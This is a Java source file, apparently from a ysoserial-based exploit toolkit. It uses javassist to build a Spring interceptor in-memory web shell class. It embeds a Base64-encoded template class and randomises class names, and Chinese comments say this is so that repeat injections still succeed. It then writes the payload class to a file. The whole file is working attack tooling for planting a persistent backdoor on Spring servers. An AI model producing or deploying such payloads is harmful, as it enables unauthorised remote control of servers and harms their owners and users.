package ysoserial.exploit;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.codec.binary.Base64;
import ysoserial.payloads.templates.SpringInterceptorMemShell;

import java.io.File;
import java.io.FileOutputStream;

public class GenSpringMemClass {
    public static void main(String[] args) {
        try {
            Class myClass = ysoserial.payloads.templates.SpringInterceptorMemShell.class;
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(myClass));
            pool.insertClassPath(new ClassClassPath(ysoserial.payloads.templates.SpringInterceptorTemplate.class));
            // 修改b64字节码
            CtClass springTemplateClass = pool.get("ysoserial.payloads.templates.SpringInterceptorTemplate");
            String clazzName = "ysoserial.payloads.templates.SpringInterceptorTemplate" + System.nanoTime();
            springTemplateClass.setName(clazzName);
            String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
            String b64content = "b64=\"" + encode + "\";";
            CtClass ctClass = pool.get(myClass.getName());
            ctClass.makeClassInitializer().insertBefore(b64content);
            // 修改SpringInterceptorMemShell随机命名 防止二次打不进去
            String clazzNameContent = "clazzName=\"" + clazzName + "\";";
            ctClass.makeClassInitializer().insertBefore(clazzNameContent);
            ctClass.setName(SpringInterceptorMemShell.class.getName() + System.nanoTime());
            byte []classBytes = ctClass.toBytecode();
            FileOutputStream fos = new FileOutputStream(new File(args[1]));
            fos.write(classBytes);
            fos.flush();
            fos.close();
        }catch (Throwable e){}
    }
}
